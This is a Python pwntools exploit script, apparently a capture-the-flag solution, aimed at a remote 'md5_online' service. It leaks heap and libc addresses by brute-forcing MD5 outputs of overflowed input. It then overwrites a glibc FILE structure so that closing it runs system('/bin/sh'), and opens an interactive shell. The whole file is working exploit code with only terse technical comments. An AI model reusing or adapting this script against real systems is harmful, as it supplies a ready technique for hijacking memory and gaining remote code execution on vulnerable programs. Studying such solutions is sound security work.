#!/usr/bin/env python
from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'neww']
#context.log_level = 'debug'

#r = process(['./ld-2.24.so', './md5_online.elf'], env={'LD_LIBRARY_PATH': '.'})
r = remote('76.74.177.238', 9004)
libc = ELF('./libc.so.6')

def md5(s):
    return hashlib.md5(s).hexdigest()

def calcptr(s, md5_hash, postfix, offset):
    i = 0
    while True:
        target = s + p32((i << 12) + offset) + postfix
        if md5(target) == md5_hash:
            return (i << 12) + offset
        i += 1


def domd5(s, salt):
    first = s[:0x200-1]
    second = s[0x200-1:]
    r.sendafter('Text: ', first)
    sleep(0.1)
    r.send(second)
    r.sendlineafter('[y/N] ', 'y' if salt else 'N')

domd5('A'*0x200, 0)
r.recvuntil('MD5: ')
md5_hash = r.recvline().strip()
heap = calcptr('A'*0x200, md5_hash, '\x61\x01', 0x44) - 0x10
buf = heap + 0x14
print hex(heap)

domd5('A'*(0x200+60), 0)
r.recvuntil('MD5: ')
md5_hash = r.recvline().strip()
libc_base = calcptr('A'*(0x200+60), md5_hash, '\x03', 0xcc0) - 0x1b6cc0
libc.address = libc_base
print hex(libc_base)
#gdb.attach(r)

FILE_struct = flat(
    0xfbad0000, # lsb must be 0 to avoid go into _IO_SYSCLOSE
    '\0'*0x18,
    next(libc.search('/bin/sh\x00')), # offset of _IO_buf_base
    '\0'*0x26,
    '\xd1', # _vtable_offset > 0 => use old_fclose
    '\0',
    heap, # offset of _lock
    libc.symbols['_IO_str_jumps'], # old_fclose use this field for vtable (8byte, add 0 padding)
    0,
    # _mode <= 0
).ljust(0x94, '\0') + '\0'*8 + p32(libc.symbols['system']) # offset of &((_IO_strfile *)0)->_s._free_buffer

domd5('A'*0x208 + FILE_struct, 0)

r.interactive()
